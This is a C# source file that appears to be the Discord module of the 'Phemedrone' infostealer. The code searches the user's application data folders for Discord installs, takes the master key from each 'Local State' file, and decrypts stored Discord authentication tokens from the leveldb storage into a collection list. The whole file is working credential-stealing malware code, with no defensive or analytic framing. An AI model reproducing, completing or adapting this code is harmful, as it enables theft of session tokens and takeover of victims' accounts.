using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Phemedrone.Classes;
using Phemedrone.Cryptography;
using Phemedrone.Extensions;

namespace Phemedrone.Services
{
    public class Discord : IService
    {
        public override PriorityLevel Priority => PriorityLevel.Medium;

        protected override LogRecord[] Collect()
        {
            var sw = new Stopwatch();
            sw.Start();
            foreach (var discordPath in Directory.GetDirectories(
                         Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "*cord*"))
            {
                var leveldb = Path.Combine(discordPath, "Local Storage", "leveldb");
                if (!Directory.Exists(leveldb)) continue;

                var localStateFile = Path.Combine(discordPath, "Local State");
                if (!File.Exists(localStateFile)) continue;
                
                var masterKey = BrowserHelpers.ParseMasterKey(localStateFile);
                if(masterKey == null) continue;
                ServiceCounter.DiscordList.AddRange(BrowserHelpers.ParseDiscordTokens(leveldb, masterKey));
            }
            sw.Stop();
            Debug.WriteLine("{0:00} {1:00} | {2}", sw.Elapsed.Minutes, sw.Elapsed.Seconds, nameof(Discord));
            return [];
        }
    }
}